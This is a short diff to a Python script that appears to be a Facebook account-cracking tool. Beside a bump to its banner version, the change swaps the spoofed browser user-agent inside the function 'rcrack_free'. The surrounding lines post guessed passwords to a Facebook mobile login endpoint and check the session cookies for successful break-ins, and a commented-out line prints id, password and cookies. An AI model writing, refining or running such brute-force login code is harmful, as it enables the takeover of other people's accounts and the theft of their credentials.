@@ -78,7 +78,7 @@ logo = ("""
  ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE                       
  ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                    
  ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mwww.facebook.com/100077633404831              
- ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m2.0          
+ ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m2.5          
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def linex():
@@ -615,7 +615,7 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36'}
+			'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
